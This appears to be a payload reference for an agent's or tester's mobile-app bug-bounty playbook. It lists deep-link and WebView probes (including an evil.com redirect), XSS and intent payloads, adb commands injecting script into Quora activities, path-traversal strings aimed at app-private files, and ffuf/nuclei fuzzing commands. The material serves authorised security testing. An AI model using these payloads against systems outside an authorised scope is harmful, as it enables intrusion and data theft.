# Mobile Application Security — HackerOne field guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Deep link -> `app://open?url=https://evil.com` `app://webview?url=javascript:...`

- WebView -> `addJavascriptInterface` abuse

- Backup -> extract shared_prefs / Keychain



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 2× | `www.pscp.tv/<user-id>/follow` |

| 2× | `<meta>` |

| 2× | `../../../lib-1/libjnigraphics.so` |

| 1× | `) could lead that an arbtrary URL was opened in a built-in browser in activity` |

| 1× | `pscp://user/<user-id> or pscpd://user/<user-id>` |

| 1× | `and be the connected to the Grab account on Android app) - or you can use my test number` |

| 1× | `<script>alert('Javascript is executed.')</script>` |

| 1× | `alert()` |

| 1× | `DELETE /api/v1/logout HTTP/1.1 / authorization: Bearer atkn_********************************** / Host: accounts.shopify.com / Connection: cl` |

| 1× | `GET /oauth/userinfo HTTP/1.1 / Accept-Encoding: gzip, deflate / authorization: Bearer *************** / ....` |

| 1× | `adb shell / am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123` |

| 1× | `am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipbo` |

| 1× | `Intent i = new Intent(); / i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity")); / i.putExtra` |

| 1× | `HTTP/1.1 400 Bad Request / Content-Encoding: gzip / Content-Type: application/json; charset=utf-8 / Date: Tue, 31 Jan 2017 17:45:43 GMT / X-` |

| 1× | `ImageList.fetchImageInfo(..)` |

| 1× | `<script> / location="https://www.google.com/search?q=</title><h1><marquee><s>Injection<!--" / </script>` |

| 1× | `<body> / <a href="intent://app/feedback#Intent;scheme=mymos;package=█████████;S.URL=javascript:(function() { alert('XSS by Cleanchain') })()` |

| 1× | `../../../../../../../data/data/jp.naver.line.android/files/something` |

| 1× | `getLastPathSegment()` |

| 1× | `file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml` |



## Parameters observed



`view` · `url` · `diff` · `navigation_bar_title` · `id` · `raw_json` · `include_zero_rate` · `settings_version` · `ro` · `auth_token` · `session` · `screenType` · `report_id` · `text_query` · `sort_type` · `sort_direction` · `limit` · `page` · `path` · `name`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_mobile.txt` | 77 |

| `~/.local/share/hackerone-reports/wordlists/params_mobile.txt` | 35 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_mobile.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_mobile.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Nuclei only sees the backend. Decompile the app and test deep links, WebViews, and local storage manually.



```sh

nuclei -u https://target -tags android,ios \

       -severity low,medium,high,critical -rl 40 -o nuclei_mobile.txt

nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \

       -rl 40 -o nuclei_mobile_misconfiguration.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
